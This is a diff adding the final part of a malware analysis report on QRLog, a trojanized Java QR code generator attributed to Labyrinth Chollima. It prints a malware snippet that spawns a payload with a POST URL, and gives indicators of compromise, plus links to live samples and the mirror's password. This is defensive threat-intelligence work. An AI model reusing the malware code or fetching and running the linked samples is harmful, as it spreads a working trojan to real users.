+shell.</li>
+</ul>
+<div class="sourceCode" id="cb32"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> cmdline <span class="op">=</span> <span class="st">&quot;java &quot;</span> <span class="op">+</span> org_path <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> uid <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> POST_URL<span class="op">;</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="bu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span>cmdline<span class="op">);</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">3000</span><span class="op">);</span></span></code></pre></div>
+<h3 id="interesting-details">Interesting details</h3>
+<ul>
+<li><p>Having performed reverse engineering on the sample and
+understanding how it communicates with its C2 (Command and Control), I
+decided to send contact requests to it using my Telegram alias in an
+attempt to secure a brief interview with the group. Their response was a
+large-scale SSH Bruteforce attack against the IP address from which I
+had sent the requests. Since this system was actually a honeypot, it was
+possible to record all the offensive infrastructure they used in the
+operation and dump it into an intelligence pulse <a href="#references">[4]</a>. Plaintext version can be found <a href="https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv">here</a>.</p></li>
+<li><p>The <code>inputFiles.lst</code> file contains Maven build
+information. From it, it is possible to know that the author of the
+malware calls himself <em>Edward</em> and uses a Windows
+platform:</p></li>
+</ul>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="co">#[...]</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/default-compile/inputFiles.lst:275:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\common\detector\MathUtils.java</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/default-compile/inputFiles.lst:276:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\client\result\VEventResultParser.java</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/default-compile/inputFiles.lst:277:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\oned\Code128Writer.java</span></span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="co">#[...]</span></span></code></pre></div>
+<ul>
+<li>This investigation was accepted as a Talk for the Recon Village at
+DEF CON 31 <a href="#references">[5]</a>.</li>
+</ul>
+<h2 id="iocs-1">IOCs</h2>
+<ul>
+<li><a href="https://github.com/birminghamcyberarms/QRLOG/blob/main/iocs/8cdccc15-5563-48bf-9493-7730aa19517c.ioc">OpenIOC
+version</a></li>
+<li>Plaintext version (see below)</li>
+<li><a href="https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv">Labyrinth
+Chollima Adversary Infrastructure</a></li>
+</ul>
+<pre><code>File:QRLog.java
+File:prefTmp.java
+File:QRCodeGenerator_Java.zip
+File:AppleAccount.pdf
+File:AppleAccountAgent
+File:p.dat
+IP:45.77.123.18
+IP:3.90.35.35
+URL:auth.pxaltonet.org
+URL:www.git-hub.me
+URI:/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view
+MD5:0fb16054a1486b754d1fcc5c6b6e1b01
+MD5:26b7d315dd19eb932a08fe474e0f0c31</code></pre>
+<h2 id="samples">Samples</h2>
+<ul>
+<li>Original Sample
+<ul>
+<li><code>https://drive.google.com/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view</code></li>
+</ul></li>
+<li>Mirror
+<ul>
+<li><a href="https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/sample.zip">sample.zip</a></li>
+<li>Password: <em>mauroeldritch</em></li>
+</ul></li>
+<li>Malicious Java file
+<ul>
+<li><a href="https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/QRCodeWriter.java">QRCodeWriter.java</a></li>
+</ul></li>
+</ul>
+<h2 id="references">References</h2>
+<ol type="1">
+<li><a href="https://www.virustotal.com/gui/url/da45ab04a24c4473acdecc8288fbaf3c200e82c32525b8378753f41eec3b5493/detection">VirusTotal</a></li>
+<li><a href="https://otx.alienvault.com/indicator/ip/45.77.123.18">AlienVault
+OTX</a></li>
+<li><a href="https://otx.alienvault.com/pulse/63e50c46063dd5d3a5992804">AlienVault
+OTX Intelligence Pulse</a></li>
+<li><a href="https://otx.alienvault.com/pulse/64cfcc366fc8f13ce315f39a">AlienVault
+OTX Intelligence Pulse - Updated</a></li>
+<li><a href="https://reconvillage.org/recon-village-talks-2023-defcon-31/">DEF
+CON 31 - Recon Village Talk Announcement</a></li>
+</ol>
+</body>
+</html>
